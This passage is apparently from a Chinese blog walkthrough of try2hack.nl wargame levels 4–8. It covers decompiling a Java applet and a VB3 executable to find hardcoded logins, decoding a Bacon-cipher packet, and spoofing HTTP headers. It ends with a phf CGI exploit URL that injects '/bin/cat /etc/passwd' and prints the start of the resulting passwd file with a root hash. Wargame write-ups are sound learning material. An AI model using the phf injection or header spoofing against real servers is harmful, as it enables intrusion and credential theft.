class=&quot;string&quot;&gt;&quot;Dialog&quot;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;12&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        lblstatus.setBounds(&lt;span class=&quot;number&quot;&gt;14&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;132&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;344&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;24&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        ButOk.setLabel(&lt;span class=&quot;string&quot;&gt;&quot;OK&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        add(ButOk);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        ButOk.setFont(&lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Font(&lt;span class=&quot;string&quot;&gt;&quot;Dialog&quot;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;12&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        ButOk.setBounds(&lt;span class=&quot;number&quot;&gt;105&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;156&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;59&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;23&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        ButReset.setLabel(&lt;span class=&quot;string&quot;&gt;&quot;Reset&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        add(ButReset);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        ButReset.setFont(&lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Font(&lt;span class=&quot;string&quot;&gt;&quot;Dialog&quot;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;12&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        ButReset.setBounds(&lt;span class=&quot;number&quot;&gt;204&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;156&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;59&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;23&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        lbltitle.setAlignment(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        add(lbltitle);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        lbltitle.setFont(&lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Font(&lt;span class=&quot;string&quot;&gt;&quot;Dialog&quot;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;12&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        lbltitle.setBounds(&lt;span class=&quot;number&quot;&gt;12&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;14&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;336&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;24&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        String s = getParameter(&lt;span class=&quot;string&quot;&gt;&quot;title&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        lbltitle.setText(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        ButOk.addActionListener(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        ButReset.addActionListener(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        infile = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; String(&lt;span class=&quot;string&quot;&gt;&quot;level4&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;try&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            inURL = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; URL(getCodeBase(), infile);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;catch&lt;/span&gt;(MalformedURLException _ex)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            getAppletContext().showStatus(&lt;span class=&quot;string&quot;&gt;&quot;Bad Counter URL:&quot;&lt;/span&gt; + inURL);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        inFile();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;为了将该class文件嵌入进去html，我自己又写了一个PasswdLevel.html，代码如下：&lt;br&gt;&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;applet&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;code&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;PasswdLevel4.class&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;width&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;500&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;height&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;500&lt;/span&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;applet&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这时可以用如下命令查看该Applet小程序：&lt;br&gt;&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;appletviewer PasswdLevel4.html&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;提示无法进行初始化，然后仔细看java源代码，发现程序读进去了一个level4的文件，于是按照URL地址:&lt;a href=&quot;http://try2hack.nl/levels/level4&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://try2hack.nl/levels/level4&lt;/a&gt; 将该文件下载下来。此时的文档结构目录为：&lt;br&gt;&lt;img src=&quot;/images/try2hack/35.png&quot; alt=&quot;35&quot;&gt;&lt;br&gt;此时再用上面的命令查看，则终于显示出来了：&lt;br&gt;&lt;img src=&quot;/images/try2hack/36.png&quot; alt=&quot;36&quot;&gt;&lt;br&gt;这里需要输入的用户名密码就是level4里面的用户名和密码，因为程序要验证，而就是通过这个文件读进去的，文件打开后内容如下：&lt;br&gt;&lt;img src=&quot;/images/try2hack/37.png&quot; alt=&quot;37&quot;&gt;&lt;br&gt;因此输入用户名：appletking，密码：pieceofcake，该关就通过了。&lt;br&gt;&lt;strong&gt;总结：这一关主要考查Java的反编译和Applet程序嵌入网页的机制。&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;Level-5&quot;&gt;&lt;a href=&quot;#Level-5&quot; class=&quot;headerlink&quot; title=&quot;Level 5&quot;&gt;&lt;/a&gt;Level 5&lt;/h3&gt;&lt;p&gt;网址：&lt;a href=&quot;http://www.try2hack.nl/levels/level5-fdvbdf.xhtml&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.try2hack.nl/levels/level5-fdvbdf.xhtml&lt;/a&gt;&lt;br&gt;来到第五关：&lt;br&gt;&lt;img src=&quot;/images/try2hack/14.png&quot; alt=&quot;14&quot;&gt;&lt;br&gt;该关要求下载一个东西，然后输入正确的用户名和密码。&lt;br&gt;下载下来之后，发现是一个exe的可执行文件，然而该可执行文件在win64位机器上面跑不起来，提示不兼容。于是在win32的虚拟机运行该文件，提示缺少VBRUN300.DLL，于是又去网上下载这个dll，安装后再打开该软件，呈现如下界面：&lt;br&gt;&lt;img src=&quot;/images/try2hack/15.png&quot; alt=&quot;15&quot;&gt;&lt;br&gt;尝试输入几个用户名和密码，均提示不正确，因此这绝对是一个软件的破解了，软件逆向之后找到验证的部分就行了。于是奠出我们的神器Ollydbg。Ollydbg逆向的时候却提示这不是一个有效的可执行文件。&lt;br&gt;于是查资料发现这是一个VB3.0程序，比较老，需要用专门的VB3.0反编译工具而不能用OD。于是又得去找专门的VB3.0的反编译工具，在这里我不得不吐槽一下国内软件的下载环境，这是像坨屎一样垃圾，不是有毒就是给你装一堆稀巴烂的软件，真是深恶痛绝！把时间都浪费在这些事情上面，给初学者带来巨大的麻烦！&lt;br&gt;最终下载的是VB3.0 Decompile，下载下来之后又学了半天怎么用，最后把我们的exe文件导入，选择输出地址之后，得到了两个文件。一个文件是main.txt,另一个文件是Level5.bat。&lt;br&gt;显示内容分别如下：&lt;br&gt;main.txt:&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Global Const gc0006 = &lt;span class=&quot;string&quot;&gt;&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.,:;-*+=~|&amp;amp;!_$#@()[]&amp;#123;&amp;#125;&amp;lt;\/&amp;gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Global Const gc000A = &lt;span class=&quot;string&quot;&gt;&quot;http://www.try2hack.nl/levels/level6-ksghvb.xhtml&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Level5.bat:&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;If  edtUsername = Mid(gc0006, &lt;span class=&quot;number&quot;&gt;56&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &amp;amp; Mid(gc0006, &lt;span class=&quot;number&quot;&gt;28&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &amp;amp; Mid(gc0006, &lt;span class=&quot;number&quot;&gt;35&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &amp;amp; Mid(gc0006, &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &amp;amp; Mid(gc0006, &lt;span class=&quot;number&quot;&gt;44&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &amp;amp; Mid(gc0006, &lt;span class=&quot;number&quot;&gt;11&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &amp;amp; Mid(gc0006, &lt;span class=&quot;number&quot;&gt;13&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &amp;amp; Mid(gc0006, &lt;span class=&quot;number&quot;&gt;21&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) Then&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  If  edtPassword = Mid(gc0006, &lt;span class=&quot;number&quot;&gt;45&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &amp;amp; Mid(gc0006, &lt;span class=&quot;number&quot;&gt;48&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &amp;amp; Mid(gc0006, &lt;span class=&quot;number&quot;&gt;25&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &amp;amp; Mid(gc0006, &lt;span class=&quot;number&quot;&gt;32&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &amp;amp; Mid(gc0006, &lt;span class=&quot;number&quot;&gt;15&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &amp;amp; Mid(gc0006, &lt;span class=&quot;number&quot;&gt;40&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &amp;amp; Mid(gc0006, &lt;span class=&quot;number&quot;&gt;25&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &amp;amp; Mid(gc0006, &lt;span class=&quot;number&quot;&gt;14&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &amp;amp; Mid(gc0006, &lt;span class=&quot;number&quot;&gt;19&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) Then&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    MsgBox &lt;span class=&quot;string&quot;&gt;&quot;Level 6 can be found at: &quot;&lt;/span&gt; &amp;amp; Left$(gc000A, &lt;span class=&quot;number&quot;&gt;37&lt;/span&gt;) &amp;amp; Mid(gc0006, &lt;span class=&quot;number&quot;&gt;21&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &amp;amp; Mid(gc0006, &lt;span class=&quot;number&quot;&gt;14&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &amp;amp; Mid(gc0006, &lt;span class=&quot;number&quot;&gt;29&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &amp;amp; Mid(gc0006, &lt;span class=&quot;number&quot;&gt;32&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &amp;amp; Mid(gc0006, &lt;span class=&quot;number&quot;&gt;12&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &amp;amp; Mid(gc0006, &lt;span class=&quot;number&quot;&gt;14&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &amp;amp; Mid(gc000A, &lt;span class=&quot;number&quot;&gt;44&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;), &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;Horray!&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    End&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  End If&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;End If&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;很明显，这相当于把用户名和密码告诉我们了，按照程序照着对应的字符去找就行了，最后输入用户名：Try2Hack，密码：ILoveDodi，得到如下界面就过关了。&lt;br&gt;&lt;img src=&quot;/images/try2hack/16.png&quot; alt=&quot;16&quot;&gt;&lt;br&gt;&lt;strong&gt;总结：这一关主要考查VB3.0程序的反编译。&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;Level-6&quot;&gt;&lt;a href=&quot;#Level-6&quot; class=&quot;headerlink&quot; title=&quot;Level 6&quot;&gt;&lt;/a&gt;Level 6&lt;/h3&gt;&lt;p&gt;网址：&lt;a href=&quot;http://www.try2hack.nl/levels/level6-kdsvbd.xhtml&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.try2hack.nl/levels/level6-kdsvbd.xhtml&lt;/a&gt;&lt;br&gt;来到第六关，这次变成了VB6.0程序：&lt;br&gt;&lt;img src=&quot;/images/try2hack/17.png&quot; alt=&quot;17&quot;&gt;&lt;br&gt;下载下来之后打开，360杀毒软件也真是狠，报告有木马，一定要删除刚下载的文件，最后把所有360程序全部关闭了。才能把程序打开。结果打开程序又出现问题，提示缺少两个组件，分别下载安装MSWINSCK.OCX和RICHTX32.OCX后才总算打开了：&lt;br&gt;&lt;img src=&quot;/images/try2hack/18.png&quot; alt=&quot;18&quot;&gt;&lt;br&gt;可以逆向吗？OD打开后看到的景象真是惨不忍睹：&lt;br&gt;&lt;img src=&quot;/images/try2hack/38.png&quot; alt=&quot;38&quot;&gt;&lt;br&gt;应该是加壳了，如果直接脱壳的话，应该能解出来，但我对这块不熟。&lt;br&gt;观察发现该客户端软件需要连接服务器进行验证，有网络的发包过程，因此可以截取其数据包进行观察。这里存在一个问题就是如果用burpsuit进行截取的话，软件的请求格式由于不是正规的http协议，无法解析。因此考虑用Wireshark，抓包如下：&lt;br&gt;&lt;img src=&quot;/images/try2hack/39.png&quot; alt=&quot;39&quot;&gt;&lt;br&gt;可以看到中间的http协议增加了一个中间层，是加密的数据，提取出来如下所示：&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(ENCRYPTION TYPE)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;B*C*N**&lt;span class=&quot;title&quot;&gt;N&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;(USERNAME)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;aaabb aaaaa aaaab abbab ababb &lt;span class=&quot;title&quot;&gt;aaaab&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;(PASSWORD)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;aabaa abbaa aaaba baaaa babba abbba baaba abaaa abbab abbaa baaaa aaaaa babaa abaab &lt;span class=&quot;title&quot;&gt;baaab&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;(PAGE)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;babab aabab abaab abbab aabbb aaaba&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;谷歌之后这里采用的是培根加密，具体介绍参见：&lt;a href=&quot;http://h2g2.com/edited_entry/A9837183&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://h2g2.com/edited_entry/A9837183&lt;/a&gt;&lt;br&gt;根据如下密码表对应进行一一解密：&lt;br&gt;&lt;img src=&quot;/images/try2hack/48.png&quot; alt=&quot;48&quot;&gt;&lt;br&gt;最后解密出来的结果为：&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;用户名：dabomb &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;密码：encryptionrawks &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;URL：xfkohc&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;输入之后就通过了：&lt;br&gt;&lt;img src=&quot;/images/try2hack/40.png&quot; alt=&quot;40&quot;&gt;&lt;br&gt;&lt;strong&gt;总结：这一节主要考查软件的脱壳或者从中间抓包截取数据和对一些加解密算法的了解&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;Level-7&quot;&gt;&lt;a href=&quot;#Level-7&quot; class=&quot;headerlink&quot; title=&quot;Level 7&quot;&gt;&lt;/a&gt;Level 7&lt;/h3&gt;&lt;p&gt;网址：&lt;a href=&quot;http://www.try2hack.nl/levels/level7-xfkohc.php&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.try2hack.nl/levels/level7-xfkohc.php&lt;/a&gt;&lt;br&gt;&lt;img src=&quot;/images/try2hack/19.png&quot; alt=&quot;19&quot;&gt;&lt;br&gt;打开之后它要求我们用IE7.66版本的浏览器。可以人为修改请求头进行欺骗。&lt;br&gt;第一步正常请求头应为：&lt;br&gt;&lt;img src=&quot;/images/try2hack/41.png&quot; alt=&quot;41&quot;&gt;&lt;br&gt;修改为IE7.66，如下（注意User-Agent字段）：&lt;br&gt;&lt;img src=&quot;/images/try2hack/42.png&quot; alt=&quot;42&quot;&gt;&lt;br&gt;结果显示：&lt;br&gt;&lt;img src=&quot;/images/try2hack/43.png&quot; alt=&quot;43&quot;&gt;&lt;br&gt;服务器传过来要求操作系统为Linux系统，继续修改，在请求头中增加Linux：&lt;br&gt;&lt;img src=&quot;/images/try2hack/44.png&quot; alt=&quot;44&quot;&gt;&lt;br&gt;反馈如下，服务器对跳转页面还有要求：&lt;br&gt;&lt;img src=&quot;/images/try2hack/45.png&quot; alt=&quot;45&quot;&gt;&lt;br&gt;继续改，增加一个Referer字段，如下：&lt;br&gt;&lt;img src=&quot;/images/try2hack/46.png&quot; alt=&quot;46&quot;&gt;&lt;br&gt;最后得到结果如下：&lt;br&gt;&lt;img src=&quot;/images/try2hack/47.png&quot; alt=&quot;47&quot;&gt;&lt;br&gt;通过了。&lt;br&gt;&lt;strong&gt;总结：该关主要考查对http请求头的构造和理解，其实都是可以伪装的。&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;Level-8&quot;&gt;&lt;a href=&quot;#Level-8&quot; class=&quot;headerlink&quot; title=&quot;Level 8&quot;&gt;&lt;/a&gt;Level 8&lt;/h3&gt;&lt;p&gt;网址：&lt;a href=&quot;http://try2hack.nl/levels/level8-balnrg.xhtml&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://try2hack.nl/levels/level8-balnrg.xhtml&lt;/a&gt;&lt;br&gt;第八关要求输入用户名和密码：&lt;br&gt;&lt;img src=&quot;/images/try2hack/20.png&quot; alt=&quot;20&quot;&gt;&lt;br&gt;查看页面源代码：&lt;br&gt;&lt;img src=&quot;/images/try2hack/21.png&quot; alt=&quot;21&quot;&gt;&lt;br&gt;因此这是一个phf漏洞的利用，具体介绍可参见&lt;a href=&quot;https://pt.wikipedia.org/wiki/Phf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;维基百科&lt;/a&gt;。&lt;br&gt;利用过程为输入如下URL：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;http://try2hack.nl/cgi-bin/phf?Qalias=%0A/bin/cat%20/etc/passwd&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://try2hack.nl/cgi-bin/phf?Qalias=%0A/bin/cat%20/etc/passwd&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;得到一份如下的文件：&lt;/p&gt;
&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;root:khXGN7s.ldaJI:&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;::&lt;span 